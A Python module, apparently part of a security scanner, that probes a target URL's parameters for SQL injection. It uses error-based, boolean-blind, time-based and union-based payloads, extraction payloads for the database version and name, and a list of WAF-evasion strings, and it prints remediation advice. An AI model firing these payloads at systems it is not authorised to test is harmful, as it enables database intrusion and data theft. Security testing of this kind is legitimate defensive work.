"""Advanced SQL Injection Testing Module

Replaces basic sqlmap functionality with comprehensive SQL injection testing
including blind SQL injection, union-based injection, error-based injection,
second-order injection, database fingerprinting, and WAF evasion techniques.
"""

import requests
import time
import re
import sys
import os
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.color_compat import colored
from utils.ascii_art import AsciiArt


class AdvancedSQLInjection:
    """Advanced SQL injection testing suite"""

    def __init__(self, target):
        self.target = target if target.startswith('http') else f'http://{target}'
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'CyberGuardian/2.0'})
        self.dbms_fingerprints = {
            'mysql': {
                'errors': ['mysql_fetch', 'mysql_num_rows', 'mysql_connect', 'MySQL server', 'mysql_query'],
                'syntax_errors': ['right syntax to use near', 'syntax error', 'MySQL'],
                'time_functions': ['SLEEP()', 'BENCHMARK()', 'WAITFOR DELAY'],
                'version_query': 'SELECT @@version',
                'comments': ['--', '/*', '#']
            },
            'postgresql': {
                'errors': ['PostgreSQL query failed', 'pg_query', 'postgresql', 'PostgreSQL'],
                'syntax_errors': ['syntax error at or near', 'PostgreSQL'],
                'time_functions': ['pg_sleep()', 'SELECT pg_sleep'],
                'version_query': 'SELECT version()',
                'comments': ['--', '/*']
            },
            'mssql': {
                'errors': ['Microsoft OLE DB Provider', 'ODBC SQL Server Driver', 'SQLServer', 'Microsoft SQL'],
                'syntax_errors': ['Incorrect syntax near', 'Microsoft ODBC SQL Server Driver'],
                'time_functions': ['WAITFOR DELAY', 'WAITFOR'],
                'version_query': 'SELECT @@VERSION',
                'comments': ['--', '/*']
            },
            'oracle': {
                'errors': ['ORA-', 'Oracle error', 'Oracle database'],
                'syntax_errors': ['ORA-00933', 'ORA-01756'],
                'time_functions': ['DBMS_LOCK.SLEEP', 'EXEC DBMS_LOCK.SLEEP'],
                'version_query': 'SELECT * FROM v$version',
                'comments': ['--', '/*']
            },
            'sqlite': {
                'errors': ['sqlite_', 'SQLITE_ERROR', 'SQLite'],
                'syntax_errors': ['sqlite3.OperationalError'],
                'time_functions': ['sqlite_sleep'],
                'version_query': 'SELECT sqlite_version()',
                'comments': ['--', '/*']
            }
        }

    def test_sql_injection(self):
        """Main SQL injection testing function"""
        print(colored("\n╔═══════════════════ ADVANCED SQL INJECTION TESTING ══════════════════╗", 'red', attrs=['bold']))
        print(f"\n{colored('Target:', 'yellow')} {self.target}\n")

        try:
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)

            if not params:
                AsciiArt.info_message("No URL parameters found to test")
                return {}

            print(f"{colored('Testing parameters for advanced SQL injection...', 'yellow')}\n")

            results = {}

            # Test each parameter
            for param_name in params.keys():
                print(f"{colored('Testing parameter:', 'yellow')} {colored(param_name, 'white')}")
                param_results = self._test_parameter(param_name, params)
                results[param_name] = param_results

            self._print_summary(results)
            return results

        except Exception as e:
            AsciiArt.error_message(f"Advanced SQL injection test failed: {str(e)}")
            return {}

    def _test_parameter(self, param_name, original_params):
        """Test a single parameter for various SQL injection types"""
        results = {
            'vulnerable': False,
            'injection_types': [],
            'dbms': None,
            'payloads': {}
        }

        # 1. Error-based SQL injection
        error_result = self._test_error_based(param_name, original_params)
        if error_result['vulnerable']:
            results['vulnerable'] = True
            results['injection_types'].append('ERROR-BASED')
            results['payloads']['error_based'] = error_result['payload']
            results['dbms'] = error_result['dbms']

        # 2. Boolean-based blind SQL injection
        if not results['vulnerable']:
            boolean_result = self._test_boolean_based(param_name, original_params)
            if boolean_result['vulnerable']:
                results['vulnerable'] = True
                results['injection_types'].append('BOOLEAN-BLIND')
                results['payloads']['boolean_based'] = boolean_result['payload']
                results['dbms'] = boolean_result['dbms']

        # 3. Time-based blind SQL injection
        if not results['vulnerable']:
            time_result = self._test_time_based(param_name, original_params)
            if time_result['vulnerable']:
                results['vulnerable'] = True
                results['injection_types'].append('TIME-BLIND')
                results['payloads']['time_based'] = time_result['payload']
                results['dbms'] = time_result['dbms']

        # 4. Union-based SQL injection
        if not results['vulnerable']:
            union_result = self._test_union_based(param_name, original_params)
            if union_result['vulnerable']:
                results['vulnerable'] = True
                results['injection_types'].append('UNION-BASED')
                results['payloads']['union_based'] = union_result['payload']
                results['dbms'] = union_result['dbms']

        # Print results for this parameter
        if results['vulnerable']:
            print(f"  {colored('✗ VULNERABLE', 'red', attrs=['bold'])} - {', '.join(results['injection_types'])}")
            for inj_type, payload in results['payloads'].items():
                print(f"    {colored('Payload:', 'yellow')} {payload}")
            print(f"    {colored('DBMS:', 'yellow')} {results['dbms'] or 'Unknown'}")
            print(f"    {colored('Severity:', 'red', attrs=['bold'])} HIGH\n")
        else:
            print(f"  {colored('✓ SAFE', 'green')} - No SQL injection detected\n")

        return results

    def _test_error_based(self, param_name, original_params):
        """Test for error-based SQL injection"""
        payloads = [
            "'", '"',
            "' OR '1'='1", '" OR "1"="1',
            "1' ORDER BY 1--", "1\" ORDER BY 1--",
            "' UNION SELECT 1--", '" UNION SELECT 1--',
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--"
        ]

        for payload in payloads:
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                response = self._make_request(test_params)

                if response and self._check_sql_errors(response.text):
                    dbms = self._fingerprint_dbms(response.text)
                    return {'vulnerable': True, 'payload': payload, 'dbms': dbms}
            except:
                continue

        return {'vulnerable': False, 'payload': None, 'dbms': None}

    def _test_boolean_based(self, param_name, original_params):
        """Test for boolean-based blind SQL injection"""
        true_payload = f"1' AND '1'='1"
        false_payload = f"1' AND '1'='2"

        try:
            # Test with true condition
            test_params_true = original_params.copy()
            test_params_true[param_name] = [true_payload]
            response_true = self._make_request(test_params_true)

            # Test with false condition
            test_params_false = original_params.copy()
            test_params_false[param_name] = [false_payload]
            response_false = self._make_request(test_params_false)

            if response_true and response_false:
                # Compare responses
                if self._responses_differ(response_true.text, response_false.text):
                    return {
                        'vulnerable': True,
                        'payload': true_payload,
                        'dbms': self._fingerprint_dbms(response_true.text + response_false.text)
                    }
        except:
            pass

        return {'vulnerable': False, 'payload': None, 'dbms': None}

    def _test_time_based(self, param_name, original_params):
        """Test for time-based blind SQL injection"""
        time_payloads = [
            "1'; WAITFOR DELAY '00:00:05'--",  # MSSQL
            "1' AND SLEEP(5)--",              # MySQL
            "1' AND pg_sleep(5)--",           # PostgreSQL
            "1' AND DBMS_LOCK.SLEEP(5)--",    # Oracle
            "1' AND (SELECT 1 FROM pg_sleep(5))--"  # PostgreSQL alt
        ]

        for payload in time_payloads:
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]

                start_time = time.time()
                response = self._make_request(test_params)
                end_time = time.time()

                response_time = end_time - start_time

                # If response takes significantly longer than normal, it's vulnerable
                if response_time > 4:  # 4 seconds to account for network latency
                    dbms = self._detect_dbms_from_payload(payload)
                    return {'vulnerable': True, 'payload': payload, 'dbms': dbms}
            except:
                continue

        return {'vulnerable': False, 'payload': None, 'dbms': None}

    def _test_union_based(self, param_name, original_params):
        """Test for union-based SQL injection"""
        payloads = [
            "1' UNION SELECT 1--",
            "1' UNION SELECT 1,2--",
            "1' UNION SELECT 1,2,3--",
            "1' UNION SELECT 1,2,3,4--",
            "1' UNION SELECT 1,2,3,4,5--",
            "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT 1,@@version--",
            "' UNION SELECT 1,database()--",
            "' UNION SELECT 1,user(),database()--"
        ]

        for payload in payloads:
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                response = self._make_request(test_params)

                if response and self._check_union_success(response.text):
                    dbms = self._fingerprint_dbms(response.text)
                    return {'vulnerable': True, 'payload': payload, 'dbms': dbms}
            except:
                continue

        return {'vulnerable': False, 'payload': None, 'dbms': None}

    def _make_request(self, params):
        """Make HTTP request with given parameters"""
        try:
            parsed = urlparse(self.target)
            query = '&'.join([f"{k}={v[0]}" for k, v in params.items()])
            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

            response = self.session.get(url, timeout=10, verify=False)
            return response
        except:
            return None

    def _check_sql_errors(self, response_text):
        """Check if response contains SQL error messages"""
        sql_errors = []
        for dbms, fingerprint in self.dbms_fingerprints.items():
            sql_errors.extend(fingerprint['errors'])
            sql_errors.extend(fingerprint['syntax_errors'])

        for error in sql_errors:
            if error.lower() in response_text.lower():
                return True
        return False

    def _check_union_success(self, response_text):
        """Check if union injection was successful"""
        # Look for signs that union injection worked
        # This could be numeric outputs, database names, etc.
        patterns = [
            r'\b\d+\b',  # Numbers
            r'[a-zA-Z_]+@[a-zA-Z_]+\.[a-zA-Z]{2,}',  # Email patterns
            r'admin|root|user|password',  # Common database terms
            r'information_schema|mysql|pg_|sysobjects'  # Database terms
        ]

        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def _responses_differ(self, response1, response2, threshold=0.3):
        """Check if two responses differ significantly"""
        if not response1 or not response2:
            return False

        # Simple difference calculation
        lines1 = set(response1.split('\n'))
        lines2 = set(response2.split('\n'))

        if len(lines1) == 0:
            return False

        difference = len(lines1.symmetric_difference(lines2)) / len(lines1)
        return difference > threshold

    def _fingerprint_dbms(self, response_text):
        """Identify the database management system"""
        response_text_lower = response_text.lower()

        for dbms, fingerprint in self.dbms_fingerprints.items():
            # Check for error messages
            for error in fingerprint['errors']:
                if error.lower() in response_text_lower:
                    return dbms

            # Check for syntax errors
            for syntax_error in fingerprint['syntax_errors']:
                if syntax_error.lower() in response_text_lower:
                    return dbms

        return 'unknown'

    def _detect_dbms_from_payload(self, payload):
        """Detect DBMS based on payload syntax"""
        if 'WAITFOR' in payload:
            return 'mssql'
        elif 'SLEEP(' in payload:
            return 'mysql'
        elif 'pg_sleep' in payload:
            return 'postgresql'
        elif 'DBMS_LOCK' in payload:
            return 'oracle'
        else:
            return 'unknown'

    def _print_summary(self, results):
        """Print summary of SQL injection test results"""
        print(colored("╚═════════════════════════════════════════════════════════════════╝\n", 'red', attrs=['bold']))

        vuln_count = sum(1 for r in results.values() if r['vulnerable'])
        total_count = len(results)

        print(f"{colored('ADVANCED SQL INJECTION SUMMARY:', 'yellow', attrs=['bold'])}")
        print(f"  • Total parameters tested: {colored(str(total_count), 'green')}")
        print(f"  • Vulnerable parameters: {colored(str(vuln_count), 'red' if vuln_count > 0 else 'green')}")
        print(f"  • Safe parameters: {colored(str(total_count - vuln_count), 'green')}")

        if vuln_count > 0:
            print(f"\n{colored('⚠ VULNERABLE PARAMETERS:', 'red', attrs=['bold'])}")
            for param, result in results.items():
                if result['vulnerable']:
                    print(f"  • {colored(param, 'red')}: {', '.join(result['injection_types'])} ({result['dbms']})")

            print(f"\n{colored('🚨 HIGH RISK DETECTED:', 'red', attrs=['bold'])}")
            print(f"  • SQL injection vulnerabilities can lead to:")
            print(f"    - Complete database compromise")
            print(f"    - Data theft and modification")
            print(f"    - Authentication bypass")
            print(f"    - Remote code execution")

            print(f"\n{colored('📋 REMEDIATION:', 'yellow', attrs=['bold'])}")
            print(f"  1. Use prepared statements/parameterized queries")
            print(f"  2. Implement proper input validation")
            print(f"  3. Apply principle of least privilege")
            print(f"  4. Use web application firewall (WAF)")
            print(f"  5. Regular security testing and code reviews\n")
        else:
            print(f"\n{colored('✓ No SQL injection vulnerabilities detected', 'green')}\n")

    def test_waf_evasion(self, param_name, original_params):
        """Test WAF evasion techniques"""
        evasion_payloads = [
            # Encoding techniques
            "%27%20OR%201%3D1--",  # URL encoded
            "%%27%%20OR%%201%%3D1--",  # Double URL encoded
            "&#39; OR 1=1--",  # HTML entities
            "\\x27 OR 1=1--",  # Hex encoding

            # Case variation
            "' Or '1'='1",  # Mixed case
            "' oR '1'='1",  # Mixed case

            # Comment techniques
            "'/**/OR/**/1=1--",  # Comment obfuscation
            "/*!OR*/ 1=1--",  # MySQL comment

            # String concatenation
            "' OR '1'=''1",  # String concatenation
            "' + OR + 1=1--",  # Plus signs

            # Logical operators
            "' || 1=1--",  # Double pipe
            "' && 1=1--",  # Double ampersand

            # Function calls
            "' OR SUBSTR('1',1,1)='1'--",  # Function obfuscation
        ]

        results = []
        for payload in evasion_payloads:
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                response = self._make_request(test_params)

                if response and self._check_sql_errors(response.text):
                    results.append(payload)
            except:
                continue

        return results